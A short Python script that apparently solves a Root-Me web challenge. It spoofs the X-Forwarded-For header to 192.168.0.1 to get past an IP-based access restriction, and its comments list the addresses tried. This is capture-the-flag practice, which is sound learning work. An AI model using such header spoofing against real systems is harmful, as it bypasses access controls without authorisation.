import requests
# 1. 127.0.0.1
# 2. 212.129.38.224
# 3. 192.168.0.1 (worked)

url = "http://challenge01.root-me.org/web-serveur/ch68/"
headers = {
    "X-Forwarded-For": "192.168.0.1"  # Replace with the desired IP address
}

response = requests.get(url, headers=headers)
print(response.text)
